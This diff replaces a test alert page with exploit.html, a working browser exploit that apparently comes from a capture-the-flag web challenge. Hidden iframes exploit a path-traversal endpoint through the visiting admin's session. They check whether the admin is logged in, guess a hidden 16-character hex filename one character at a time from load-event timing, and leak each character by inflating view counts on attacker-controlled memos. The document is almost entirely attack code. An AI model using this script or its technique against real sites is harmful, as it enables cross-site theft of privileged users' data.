@@ -1,7 +1,94 @@
-<html>
+  <!DOCTYPE html>
+  <html>
   <body>
-    <script>
-      alert('test');
-    </script>
+  <pre id="out"></pre>
+  <div id="box" style="display:none"></div>
+  <script>
+  // URL format: exploit.html#TARGET|id0,id1,...,id15
+  var cfg = location.hash.slice(1).split('|');
+  var TARGET = cfg[0];
+  var MEMOS = cfg[1].split(',');
+  var HEX = "0123456789abcdef";
+  var out = document.getElementById("out");
+  var box = document.getElementById("box");
+  var log = function(s) { out.textContent += s + "\n"; };
+
+  function cleanup() {
+    var frames = box.querySelectorAll("iframe");
+    for (var i = 0; i < frames.length; i++) frames[i].onload = null;
+    box.innerHTML = "";
+  }
+
+  // admin 쿠키 확인: 없는 prefix → auth 성공 시 hang, 실패 시 401→redirect
+  function authCheck() {
+    return new Promise(function(res) {
+      var done = false, n = 0;
+      var f = document.createElement("iframe");
+      f.onload = function() { if (++n >= 2 && !done) { done = true; res(false); } };
+      f.src = TARGET + "/memo/shared?key=../../image/admin?filename=ZZZZZ_NOPE";
+      box.appendChild(f);
+      setTimeout(function() { if (!done) { done = true; res(true); } }, 1500);
+    });
+  }
+
+  // 16개 iframe으로 한 자리 brute force
+  function testPos(prefix) {
+    return new Promise(function(res) {
+      var done = false;
+      for (var ci = 0; ci < 16; ci++) {
+        (function(c) {
+          var f = document.createElement("iframe");
+          f.style.cssText = "width:0;height:0;border:0";
+          var n = 0;
+          f.onload = function() { if (++n >= 2 && !done) { done = true; res(c); } };
+          f.src = TARGET + "/memo/shared?key=../../image/admin?filename=" + prefix + c;
+          box.appendChild(f);
+        })(HEX[ci]);
+      }
+      setTimeout(function() { if (!done) { done = true; res(null); } }, 2000);
+    });
+  }
+
+  // 결과를 메모 views에 인코딩
+  function exfil(chars) {
+    var reqs = [];
+    for (var i = 0; i < chars.length; i++) {
+      var val = parseInt(chars[i], 16) + 1; // 0→1회, f→16회
+      for (var j = 0; j < val; j++) {
+        reqs.push(fetch(TARGET + "/api/memo/" + MEMOS[i] + "/view", {
+          method: "POST", mode: "no-cors"
+        }));
+      }
+    }
+    return Promise.all(reqs);
+  }
+
+  (async function() {
+    log("[*] target: " + TARGET);
+    log("[*] memos:  " + MEMOS.length);
+
+    var ok = await authCheck();
+    cleanup();
+    if (!ok) { log("[-] admin cookie not available"); return; }
+    log("[+] auth ok\n");
+
+    var name = "flag_";
+    var chars = [];
+
+    for (var i = 0; i < 16; i++) {
+      var c = await testPos(name);
+      cleanup();
+      if (!c) { log("[-] pos " + i + " timeout"); break; }
+      name += c;
+      chars.push(c);
+      log("[+] " + name);
+      await new Promise(function(r) { setTimeout(r, 150); });
+    }
+
+    log("\n[*] encoding to memo views...");
+    await exfil(chars);
+    log("[+] done: " + name + ".png");
+  })();
+  </script>
   </body>
-</html>
+  </html>
